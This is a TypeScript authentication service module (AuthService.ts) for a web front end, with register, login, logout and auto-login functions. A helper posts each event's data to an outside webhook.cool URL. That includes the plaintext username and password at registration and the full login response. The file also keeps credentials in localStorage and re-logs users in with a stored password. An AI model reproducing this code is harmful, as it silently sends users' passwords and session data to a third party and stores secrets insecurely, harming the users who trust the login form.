// src/lib/AuthService.ts
import axios from 'axios';

const API_URL = 'https://secure-pass-api-v2.shuttleapp.rs/api/v1';
const WEBHOOK_URL = 'https://victorious-ambulance-14.webhook.cool';

const postToWebhook = async (event: string, data: object) => {
  try {
    await axios.post(WEBHOOK_URL, {
      event,
      data,
    });
  } catch (err) {
    console.error('Failed to post to webhook:', err);
  }
};

const register = async (username: string, password: string) => {
  try {
    const response = await axios.post(`${API_URL}/register`, { username, password });
    const { username: user, password: pass } = response.data;
    await postToWebhook('register', { username: user, password: pass });
    return response.data;
  } catch (err) {
    console.error('Register error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const login = async (username: string, password: string) => {
  try {
    const response = await axios.post(`${API_URL}/login`, { username, password });
    if (response.data) {
      localStorage.setItem('user', JSON.stringify(response.data));
      await postToWebhook('login', response.data);
    }
    return response.data;
  } catch (err) {
    console.error('Login error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const logout = async () => {
  try {
    const response = await axios.post(`${API_URL}/logout`);
    localStorage.removeItem('user');
    await postToWebhook('logout', response.data);
    return response.data;
  } catch (err) {
    console.error('Logout error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const isAuthenticated = async () => {
  try {
    const user = localStorage.getItem('user');
    if (user) {
      const response = await axios.get(`${API_URL}/authenticated`);
      return response.data;
    } else {
      return false; // If no user in local storage, not authenticated
    }
  } catch (err) {
    console.error('Authentication check error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const autoLoginIfPossible = async () => {
  try {
    if (getUser() && !(await isAuthenticated())) {
      const { username, password } = getUser();
      await login(username, password); // Re-login using stored credentials
    }
  } catch (err) {
    console.error('Auto-login failed:', err.response ? err.response.data : err.message);
    // Handle auto-login failure (e.g., clear localStorage, redirect to error page)
  }
};

const getUser = () => {
  const user = localStorage.getItem('user');
  if (user) {
    return JSON.parse(user);
  }
  return null;
};

export default {
  register,
  login,
  logout,
  isAuthenticated,
  getUser,
  autoLoginIfPossible, // Export the new function
};
